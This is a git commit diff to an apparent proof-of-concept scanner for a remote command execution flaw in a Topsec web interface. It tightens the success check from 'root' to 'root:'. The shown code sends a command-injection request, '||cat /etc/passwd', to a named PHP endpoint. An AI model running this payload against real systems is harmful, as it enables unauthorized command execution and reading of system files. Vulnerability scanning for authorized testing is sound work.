979c5a88dbbf340391318701ab9c21fcaf68df42
hbdhack3r <51362701+SCAMagic@users.noreply.github.com>
2023-01-11 15:00:01 +0800

    Update poc-yaml-topsec-rce.py

--- pocs/poc-yaml-topsec-rce.py
+++ pocs/poc-yaml-topsec-rce.py
@@ -9,7 +9,7 @@ def scan(baseurl):
 	url=baseurl+"view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20/etc/passwd"
 	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
 	response=requests.get(url,headers=headers,timeout=5,verify=False)
-	if response.status_code == 200 and "root" in response.text:
+	if response.status_code == 200 and "root:" in response.text:
 		r0=True
 	else:
 		r0=False
